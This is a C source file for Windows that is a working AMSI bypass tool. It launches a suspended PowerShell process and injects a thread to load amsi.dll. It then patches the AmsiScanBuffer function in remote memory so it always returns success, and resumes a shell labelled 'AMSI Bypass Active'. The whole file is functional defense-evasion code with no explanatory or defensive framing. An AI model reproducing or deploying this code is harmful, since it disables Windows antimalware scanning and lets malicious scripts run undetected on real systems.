#include <windows.h>
#include <tlhelp32.h>

BOOL PatchRemoteAMSI(HANDLE hProcess) {
    HMODULE hAmsiLocal = LoadLibraryA("amsi.dll");
    if (!hAmsiLocal) return FALSE;

    PBYTE pAmsiScanLocal = (PBYTE)GetProcAddress(hAmsiLocal, "AmsiScanBuffer");
    if (!pAmsiScanLocal) return FALSE;

    SIZE_T offset = (SIZE_T)pAmsiScanLocal - (SIZE_T)hAmsiLocal;

    HMODULE hMods[1024];
    DWORD cbNeeded;
    HMODULE hAmsiRemote = NULL;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char modName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
                if (_stricmp(modName, "amsi.dll") == 0) {
                    hAmsiRemote = hMods[i];
                    break;
                }
            }
        }
    }

    if (!hAmsiRemote) return FALSE;


    PBYTE pRemoteFunc = (PBYTE)hAmsiRemote + offset;

    BYTE patch[] = {0x31, 0xC0, 0xC3};

    DWORD oldProt;
    SIZE_T written;
    
    if (!VirtualProtectEx(hProcess, pRemoteFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    if (!WriteProcessMemory(hProcess, pRemoteFunc, patch, sizeof(patch), &written))
        return FALSE;

    VirtualProtectEx(hProcess, pRemoteFunc, sizeof(patch), oldProt, &oldProt);

    return TRUE;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    char cmd[] = "powershell.exe -NoExit -Command \"Write-Host '[*] AMSI Bypass Active' -ForegroundColor Green\"";
    
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    Sleep(1000);

    LPVOID pRemoteBuf = VirtualAllocEx(pi.hProcess, NULL, 32, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf) {
        char dllName[] = "amsi.dll";
        WriteProcessMemory(pi.hProcess, pRemoteBuf, dllName, sizeof(dllName), NULL);
        
        HMODULE hK32 = GetModuleHandleA("kernel32.dll");
        LPVOID pLoadLib = GetProcAddress(hK32, "LoadLibraryA");
        
        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteBuf, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
        
        VirtualFreeEx(pi.hProcess, pRemoteBuf, 0, MEM_RELEASE);
    }

    Sleep(500);
    PatchRemoteAMSI(pi.hProcess);
    Sleep(200);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
